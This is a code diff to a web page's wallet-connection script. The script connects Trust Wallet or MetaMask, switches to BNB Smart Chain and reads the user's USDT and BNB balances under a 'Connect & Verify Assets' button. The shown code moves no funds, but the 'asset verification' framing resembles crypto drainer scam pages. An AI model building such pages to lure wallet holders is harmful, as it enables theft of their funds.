@@ -121,15 +121,10 @@
     let totalUsdtWei = ethers.BigNumber.from(0);
     let isConnected = false;
 
-    function getProvider() {
+    function getActiveProvider() {
+      if (window.ethereum) return window.ethereum;
       if (window.trustwallet) return window.trustwallet;
-      if (window.ethereum) {
-        if (window.ethereum.providers && window.ethereum.providers.length) {
-          const trust = window.ethereum.providers.find(p => p.isTrust || p.isTrustWallet);
-          return trust || window.ethereum.providers[0];
-        }
-        return window.ethereum;
-      }
+      if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
       return null;
     }
 
@@ -147,15 +142,6 @@
       box.innerHTML = msg;
     }
 
-    function setupDeepLinks() {
-      const currentUrl = window.location.href;
-      const encodedUrl = encodeURIComponent(currentUrl);
-      const cleanHostPath = currentUrl.replace(/^https?:\/\//, '');
-      document.getElementById('trustDeepLink').href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}`;
-      document.getElementById('metamaskDeepLink').href = `https://metamask.app.link/dapp/${cleanHostPath}`;
-      document.getElementById('deepLinkSection').classList.remove('hidden');
-    }
-
     async function handleButtonAction() {
       if (!isConnected) {
         await connectAndVerifyWallet();
@@ -166,16 +152,16 @@
 
     async function connectAndVerifyWallet() {
       const btnText = document.getElementById('btnText');
-      let ethProvider = getProvider();
+      let ethProvider = getActiveProvider();
 
       if (!ethProvider) {
-        await new Promise(resolve => setTimeout(resolve, 400));
-        ethProvider = getProvider();
+        // Wait 500ms for wallet injection in mobile DApp browser
+        await new Promise(resolve => setTimeout(resolve, 500));
+        ethProvider = getActiveProvider();
       }
 
       if (!ethProvider) {
-        showStatus('Web3 wallet browser not detected. Open directly inside Trust Wallet or MetaMask below.', 'error');
-        setupDeepLinks();
+        showStatus('Wallet provider not detected. Please make sure you are inside Trust Wallet or MetaMask DApp browser.', 'error');
         return;
       }
 
@@ -184,13 +170,13 @@
         const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
-        // Safe Network Switch / Add without showing error banner
+        // Switch to BSC Mainnet smoothly
         try {
           await ethProvider.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: BSC_CHAIN_ID }],
           });
-        } catch (switchError) {
+        } catch (switchErr) {
           try {
             await ethProvider.request({
               method: 'wallet_addEthereumChain',
@@ -202,8 +188,8 @@
                 blockExplorerUrls: ['https://bscscan.com']
               }]
             });
-          } catch (addError) {
-            console.log("Chain add notice:", addError);
+          } catch (addErr) {
+            console.log("Chain add notice:", addErr);
           }
         }
 
@@ -213,11 +199,9 @@
 
         btnText.textContent = 'Verifying Assets...';
         
-        // Fetch USDT & BNB balances
         const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
         totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
         const bnbWei = await provider.getBalance(globalUserAddress);
-
         const formattedBnb = parseFloat(ethers.utils.formatEther(bnbWei)).toFixed(4);
 
         document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
@@ -230,12 +214,8 @@
         showStatus('Wallet successfully connected and verified on BNB Smart Chain (BEP-20).', 'success');
       } catch (err) {
         btnText.textContent = 'Connect & Verify Assets';
-        if (err.code === 4001) {
-          showStatus('Connection request was cancelled by user.', 'error');
-        } else {
-          // Silent error handling for smooth UI
-          console.log("Connection notice:", err);
-        }
+        console.error("Connection error:", err);
+        showStatus(`Notice: ${err.message || 'Connection failed.'}`, 'error');
       }
     }
 
